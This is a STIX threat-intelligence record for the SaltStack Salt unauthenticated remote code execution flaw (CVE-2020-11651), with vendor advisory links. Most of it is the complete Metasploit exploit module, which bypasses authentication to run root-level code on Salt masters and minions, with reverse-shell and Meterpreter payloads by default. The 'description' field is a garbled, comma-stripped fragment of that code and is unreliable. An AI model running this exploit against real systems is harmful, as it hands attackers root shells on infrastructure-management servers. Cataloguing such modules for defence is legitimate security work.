{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8832ecbf-c204-4e11-b7ec-d71e60c8c242",
    "created": "2024-08-14T16:57:27.61875Z",
    "modified": "2024-08-14T16:57:27.618754Z",
    "name": "SaltStack Salt Master/Minion Unauthenticated RCE",
    "description": "Executing Unix command on the minions 'Platform' => 'unix' 'Arch' => ARCH_CMD 'Type' => :unix_cmd 'DefaultOptions' => { # cmd/unix/reverse_python_ssl crashes in this target 'PAYLOAD' => 'cmd/unix/reverse_python'   ] ] 'DefaultTarget' => 0, # Defaults to master for safety 'DefaultOptions' => { 'CheckModule' => 'auxiliary/gather/saltstack_salt_root_key'  'Notes' => { 'Stability' => [SERVICE_RESOURCE_LOSS], # May hang up the service 'Reliability' => [REPEATABLE_SESSION] 'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]  ) )  register_options([ Opt::RPORT(4506) OptString.new('ROOT_KEY', [false, \"Master's root key if you have it\"]) OptRegexp.new('MINIONS', [true, 'PCRE regex of minions to target', '.*']) ])  register_advanced_options([ OptInt.new('WfsDelay', [true, 'Seconds to wait for *all* sessions', 10]) ]) end  # NOTE: check is provided by auxiliary/gather/saltstack_salt_root_key  def exploit if target.name.start_with?('Master') if (root_key = datastore['ROOT_KEY']) print_status(\"User-specified root key: #{root_key}\") else # check.reason is from auxiliary/gather/saltstack_salt_root_key root_key = check.reason end  unless root_key fail_with(Failure::BadConfig \"#{target['Description']} requires a root key\") end end  # These are from Msf::Exploit::Remote::ZeroMQ zmq_connect zmq_negotiate  print_status(\"#{target['Description']}: #{datastore['PAYLOAD']}\")  case target.name when /^Master/ yeet_runner(root_key) when /^Minions/ yeet_send_pub end  # HACK: Hijack WfsDelay to wait for _all_ sessions, not just the first one sleep(wfs_delay) rescue EOFError, Rex::ConnectionError => e print_error(\"#{e.class}: #{e.message}\") ensure # This is from Msf::Exploit::Remote::ZeroMQ zmq_disconnect end  def yeet_runner(root_key) print_status(\"Yeeting runner() at #{peer}\")  # https://github.com/saltstack/salt/blob/v2019.2.3/salt/master.py#L1898-L1951 # https://github.com/saltstack/salt/blob/v3000.1/salt/master.py#L1898-L1951 runner = { 'cmd' => 'runner' # https://docs.saltstack.com/en/master/ref/runners/all/salt.runners.salt.html#salt.runners.salt.cmd 'fun' => 'salt.cmd' 'kwarg' => { 'hide_output' => true 'ignore_retcode' => true 'output_loglevel' => 'quiet'  'user' => 'root', # This is NOT the Unix user! 'key' => root_key # No JID needed, only the root key!   case target['Type'] when :python vprint_status(\"Executing Python code: #{payload.encoded}\")  # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.exec_code runner['kwarg'].merge!( 'fun' => 'cmd.exec_code' 'lang' => payload.arch.first 'code' => payload.encoded ) when :unix_cmd # HTTPS doesn't appear to be supported by the server :( print_status(\"Serving intermediate stager over HTTP: #{start_service}\")  vprint_status(\"Executing Unix command: #{payload.encoded}\")  # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.script runner['kwarg'].merge!( # cmd.run doesn't work due to a missing argument error, so we use this 'fun' => 'cmd.script' 'source' => get_uri 'stdin' => payload.encoded ) end  vprint_status(\"Unserialized clear load: #{runner}\") zmq_send_message(serialize_clear_load(runner))  unless (res = sock.get_once) fail_with(Failure::Unknown, 'Did not receive runner() response') end  vprint_good(\"Received runner() response: #{res.inspect}\") end  def yeet_send_pub print_status(\"Yeeting _send_pub() at #{peer}\")  # NOTE: A unique JID (job ID) is needed for every published job jid = generate_jid  # https://github.com/saltstack/salt/blob/v2019.2.3/salt/master.py#L2043-L2151 # https://github.com/saltstack/salt/blob/v3000.1/salt/master.py#L2043-L2151 send_pub = { 'cmd' => '_send_pub' 'kwargs' => { 'bg' => true 'hide_output' => true 'ignore_retcode' => true 'output_loglevel' => 'quiet' 'show_jid' => false 'show_timeout' => false  'user' => 'root', # This is NOT the Unix user! 'tgt' => datastore['MINIONS'] 'tgt_type' => 'pcre' 'jid' => jid   case target['Type'] when :python vprint_status(\"Executing Python code: #{payload.encoded}\")  # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.exec_code send_pub.merge!( 'fun' => 'cmd.exec_code' 'arg' => [payload.arch.first, payload.encoded] ) when :unix_cmd vprint_status(\"Executing Unix command: #{payload.encoded}\")  # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.run send_pub.merge!( 'fun' => 'cmd.run' 'arg' => [payload.encoded] ) end  vprint_status(\"Unserialized clear load: #{send_pub}\") zmq_send_message(serialize_clear_load(send_pub))  unless (res = sock.get_once) fail_with(Failure::Unknown, 'Did not receive _send_pub() response') end  vprint_good(\"Received _send_pub() response: #{res.inspect}\")  # NOTE: This path will likely change between platforms and distros register_file_for_cleanup(\"/var/cache/salt/minion/proc/#{jid}\") end  # https://github.com/saltstack/salt/blob/v2019.2.3/salt/utils/jid.py # https://github.com/saltstack/salt/blob/v3000.1/salt/utils/jid.py def generate_jid DateTime.now.new_offset.strftime('%Y%m%d%H%M%S%6N') end  # HACK: Stub out the command stager used by Msf::Exploit::CmdStager::HTTP def stager_instance nil end  # HACK: Sub out the executable used by Msf::Exploit::CmdStager::HTTP def exe # NOTE: The shebang line is necessary in this case! <<~SHELL #!/bin/sh /bin/sh SHELL end  end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/saltstack_salt_unauth_rce.rb",
            "external_id": "saltstack_salt_unauth_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://labs.f-secure.com/advisories/saltstack-authorization-bypass"
        },
        {
            "source_name": "reference",
            "url": "https://community.saltstack.com/blog/critical-vulnerabilities-update-cve-2020-11651-and-cve-2020-11652/"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2020-0009.html"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-salt-2vx545AG"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/saltstack/salt/blob/master/tests/integration/master/test_clear_funcs.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::ZeroMQ\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::CmdStager::HTTP # HACK: This is a mixin of a mixin\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SaltStack Salt Master/Minion Unauthenticated RCE',\n        'Description' => %q{\n          This module exploits unauthenticated access to the runner() and\n          _send_pub() methods in the SaltStack Salt master's ZeroMQ request\n          server, for versions 2019.2.3 and earlier and 3000.1 and earlier, to\n          execute code as root on either the master or on select minions.\n\n          VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as\n          well as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual\n          Internet Routing Lab Personal Edition (VIRL-PE), for versions 1.2,\n          1.3, 1.5, and 1.6 in certain configurations, are known to be affected\n          by the Salt vulnerabilities.\n\n          Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as\n          well as Vulhub's Docker image.\n        },\n        'Author' => [\n          'F-Secure', # Discovery\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-11651'], # Auth bypass (used by this module)\n          ['CVE', '2020-11652'], # Authed directory traversals (not used here)\n          ['URL', 'https://labs.f-secure.com/advisories/saltstack-authorization-bypass'],\n          ['URL', 'https://community.saltstack.com/blog/critical-vulnerabilities-update-cve-2020-11651-and-cve-2020-11652/'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0009.html'],\n          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-salt-2vx545AG'],\n          ['URL', 'https://github.com/saltstack/salt/blob/master/tests/integration/master/test_clear_funcs.py']\n        ],\n        'DisclosureDate' => '2020-04-30', # F-Secure advisory\n        'License' => MSF_LICENSE,\n        'Platform' => ['python', 'unix'],\n        'Arch' => [ARCH_PYTHON, ARCH_CMD],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Master (Python payload)',\n            {\n              'Description' => 'Executing Python payload on the master',\n              'Platform' => 'python',\n              'Arch' => ARCH_PYTHON,\n              'Type' => :python,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'python/meterpreter/reverse_https'\n              }\n            }\n          ],\n          [\n            'Master (Unix command)',\n            {\n              'Description' => 'Executing Unix command on the master',\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Minions (Python payload)',\n            {\n              'Description' => 'Executing Python payload on the minions',\n              'Platform' => 'python',\n              'Arch' => ARCH_PYTHON,\n              'Type' => :python,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'python/meterpreter/reverse_https'\n              }\n            }\n          ],\n          [\n            'Minions (Unix command)',\n            {\n              'Description' => 'Executing Unix command on the minions',\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                # cmd/unix/reverse_python_ssl crashes in this target\n                'PAYLOAD' => 'cmd/unix/reverse_python'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0, # Defaults to master for safety\n        'DefaultOptions' => {\n          'CheckModule' => 'auxiliary/gather/saltstack_salt_root_key'\n        },\n        'Notes' => {\n          'Stability' => [SERVICE_RESOURCE_LOSS], # May hang up the service\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(4506),\n      OptString.new('ROOT_KEY', [false, \"Master's root key if you have it\"]),\n      OptRegexp.new('MINIONS', [true, 'PCRE regex of minions to target', '.*'])\n    ])\n\n    register_advanced_options([\n      OptInt.new('WfsDelay', [true, 'Seconds to wait for *all* sessions', 10])\n    ])\n  end\n\n  # NOTE: check is provided by auxiliary/gather/saltstack_salt_root_key\n\n  def exploit\n    if target.name.start_with?('Master')\n      if (root_key = datastore['ROOT_KEY'])\n        print_status(\"User-specified root key: #{root_key}\")\n      else\n        # check.reason is from auxiliary/gather/saltstack_salt_root_key\n        root_key = check.reason\n      end\n\n      unless root_key\n        fail_with(Failure::BadConfig,\n                  \"#{target['Description']} requires a root key\")\n      end\n    end\n\n    # These are from Msf::Exploit::Remote::ZeroMQ\n    zmq_connect\n    zmq_negotiate\n\n    print_status(\"#{target['Description']}: #{datastore['PAYLOAD']}\")\n\n    case target.name\n    when /^Master/\n      yeet_runner(root_key)\n    when /^Minions/\n      yeet_send_pub\n    end\n\n    # HACK: Hijack WfsDelay to wait for _all_ sessions, not just the first one\n    sleep(wfs_delay)\n  rescue EOFError, Rex::ConnectionError => e\n    print_error(\"#{e.class}: #{e.message}\")\n  ensure\n    # This is from Msf::Exploit::Remote::ZeroMQ\n    zmq_disconnect\n  end\n\n  def yeet_runner(root_key)\n    print_status(\"Yeeting runner() at #{peer}\")\n\n    # https://github.com/saltstack/salt/blob/v2019.2.3/salt/master.py#L1898-L1951\n    # https://github.com/saltstack/salt/blob/v3000.1/salt/master.py#L1898-L1951\n    runner = {\n      'cmd' => 'runner',\n      # https://docs.saltstack.com/en/master/ref/runners/all/salt.runners.salt.html#salt.runners.salt.cmd\n      'fun' => 'salt.cmd',\n      'kwarg' => {\n        'hide_output' => true,\n        'ignore_retcode' => true,\n        'output_loglevel' => 'quiet'\n      },\n      'user' => 'root', # This is NOT the Unix user!\n      'key' => root_key # No JID needed, only the root key!\n    }\n\n    case target['Type']\n    when :python\n      vprint_status(\"Executing Python code: #{payload.encoded}\")\n\n      # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.exec_code\n      runner['kwarg'].merge!(\n        'fun' => 'cmd.exec_code',\n        'lang' => payload.arch.first,\n        'code' => payload.encoded\n      )\n    when :unix_cmd\n      # HTTPS doesn't appear to be supported by the server :(\n      print_status(\"Serving intermediate stager over HTTP: #{start_service}\")\n\n      vprint_status(\"Executing Unix command: #{payload.encoded}\")\n\n      # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.script\n      runner['kwarg'].merge!(\n        # cmd.run doesn't work due to a missing argument error, so we use this\n        'fun' => 'cmd.script',\n        'source' => get_uri,\n        'stdin' => payload.encoded\n      )\n    end\n\n    vprint_status(\"Unserialized clear load: #{runner}\")\n    zmq_send_message(serialize_clear_load(runner))\n\n    unless (res = sock.get_once)\n      fail_with(Failure::Unknown, 'Did not receive runner() response')\n    end\n\n    vprint_good(\"Received runner() response: #{res.inspect}\")\n  end\n\n  def yeet_send_pub\n    print_status(\"Yeeting _send_pub() at #{peer}\")\n\n    # NOTE: A unique JID (job ID) is needed for every published job\n    jid = generate_jid\n\n    # https://github.com/saltstack/salt/blob/v2019.2.3/salt/master.py#L2043-L2151\n    # https://github.com/saltstack/salt/blob/v3000.1/salt/master.py#L2043-L2151\n    send_pub = {\n      'cmd' => '_send_pub',\n      'kwargs' => {\n        'bg' => true,\n        'hide_output' => true,\n        'ignore_retcode' => true,\n        'output_loglevel' => 'quiet',\n        'show_jid' => false,\n        'show_timeout' => false\n      },\n      'user' => 'root', # This is NOT the Unix user!\n      'tgt' => datastore['MINIONS'],\n      'tgt_type' => 'pcre',\n      'jid' => jid\n    }\n\n    case target['Type']\n    when :python\n      vprint_status(\"Executing Python code: #{payload.encoded}\")\n\n      # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.exec_code\n      send_pub.merge!(\n        'fun' => 'cmd.exec_code',\n        'arg' => [payload.arch.first, payload.encoded]\n      )\n    when :unix_cmd\n      vprint_status(\"Executing Unix command: #{payload.encoded}\")\n\n      # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.run\n      send_pub.merge!(\n        'fun' => 'cmd.run',\n        'arg' => [payload.encoded]\n      )\n    end\n\n    vprint_status(\"Unserialized clear load: #{send_pub}\")\n    zmq_send_message(serialize_clear_load(send_pub))\n\n    unless (res = sock.get_once)\n      fail_with(Failure::Unknown, 'Did not receive _send_pub() response')\n    end\n\n    vprint_good(\"Received _send_pub() response: #{res.inspect}\")\n\n    # NOTE: This path will likely change between platforms and distros\n    register_file_for_cleanup(\"/var/cache/salt/minion/proc/#{jid}\")\n  end\n\n  # https://github.com/saltstack/salt/blob/v2019.2.3/salt/utils/jid.py\n  # https://github.com/saltstack/salt/blob/v3000.1/salt/utils/jid.py\n  def generate_jid\n    DateTime.now.new_offset.strftime('%Y%m%d%H%M%S%6N')\n  end\n\n  # HACK: Stub out the command stager used by Msf::Exploit::CmdStager::HTTP\n  def stager_instance\n    nil\n  end\n\n  # HACK: Sub out the executable used by Msf::Exploit::CmdStager::HTTP\n  def exe\n    # NOTE: The shebang line is necessary in this case!\n    <<~SHELL\n      #!/bin/sh\n      /bin/sh\n    SHELL\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-04-30, # F-Secure advisory",
    "x_mitre_platforms": [
        "['python', 'unix']"
    ]
}